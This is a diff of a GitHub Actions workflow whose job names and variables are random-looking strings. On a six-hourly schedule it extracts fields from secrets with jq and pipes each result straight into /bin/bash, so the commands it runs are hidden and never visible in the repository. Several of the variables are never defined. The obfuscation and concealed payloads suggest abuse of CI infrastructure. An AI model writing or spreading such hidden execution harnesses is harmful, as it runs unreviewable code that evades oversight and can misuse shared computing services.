@@ -1,9 +1,9 @@
 name: zhaowushi4178
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 1/6 * * *'
-
+    - cron: '45 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,22 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhaowushi4178
         env:
-          cmezi42859: ${{ secrets.cmezi42859 }}
+          fpna67: ${{ secrets.fpna67 }}
         run: |
-          echo $cmezi42859 | jq -r .gbi7117 | /bin/bash
-          echo $zm4509 | jq -r .fct84675 | /bin/bash
-          echo $vypq8 | jq -r .brncg56 | /bin/bash
-          echo $jvyqd94 | jq -r .jxmyz398 | /bin/bash
-          echo $m1 | jq -r .nef6990 | /bin/bash
-          echo $n3040 | jq -r .qh13 | /bin/bash
-          echo $gleji5618 | jq -r .aubn2 | /bin/bash
-          echo $syu335 | jq -r .f1 | /bin/bash
-          echo $w36 | jq -r .khue77 | /bin/bash
-          echo $fovdz694 | jq -r .f58215 | /bin/bash
-          echo $xdecv8434 | jq -r .oxmzm9 | /bin/bash
-          echo $ap3638 | jq -r .evt883 | /bin/bash
-          echo $ijxy75 | jq -r .nx8255 | /bin/bash
-          echo $lf09299 | jq -r .tg04 | /bin/bash
-          echo $dng2583 | jq -r .ay971 | /bin/bash
-          echo $wjw257 | jq -r .v34 | /bin/bash
+          echo $fpna67 | jq -r .jwem254 | /bin/bash
+          echo $wi5319 | jq -r .lbhqf79 | /bin/bash
+          echo $q1891 | jq -r .fgif64399 | /bin/bash
+          echo $zpo04815 | jq -r .f584 | /bin/bash
+          echo $amc2 | jq -r .w5032 | /bin/bash
+          echo $cu22569 | jq -r .o96 | /bin/bash
+          echo $ps18 | jq -r .nahqe98 | /bin/bash
+          echo $rxsh51266 | jq -r .psm78570 | /bin/bash
+          echo $sw617 | jq -r .f1 | /bin/bash
+          echo $yr1 | jq -r .senp8937 | /bin/bash
 
